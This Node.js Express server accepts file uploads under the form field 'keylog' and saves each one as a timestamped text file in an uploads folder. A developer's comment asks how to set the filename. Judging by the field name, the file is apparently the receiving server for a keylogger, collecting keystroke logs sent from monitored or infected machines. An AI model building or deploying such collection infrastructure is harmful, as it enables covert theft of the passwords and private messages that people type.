const express = require("express");
const morgan = require("morgan");
const multer = require("multer");

const port = 80;
var storage = multer.diskStorage({
    destination: "uploads/",
    filename: function (req, file, cb) {
        //req.body is empty...
        //How could I get the new_file_name property sent from client here?
        let time = new Date();
        let year = time.getFullYear();
        let month = time.getMonth();
        let date = time.getDate();
        let hour = time.getHours();
        let minute = time.getMinutes();

        cb(null, `data-${year}-${month + 1}-${date}-${hour}-${minute}.txt`);
    },
});
const upload = multer({ storage: storage });

const app = express();

app.use(morgan("tiny"));

app.post("/", upload.single("keylog"), async (req, res) => {
    try {
        const file = req.file;
        if (file) {
            return res.status(200).json({
                msg: "Success",
            });
        }
        res.status(400).json({
            status: 400,
            msg: "File not found",
        });
    } catch (error) {
        res.status(400).json({
            msg: "Failed",
        });
    }
});

app.listen(port, () => {
    console.log(`App run port ${port}`);
});
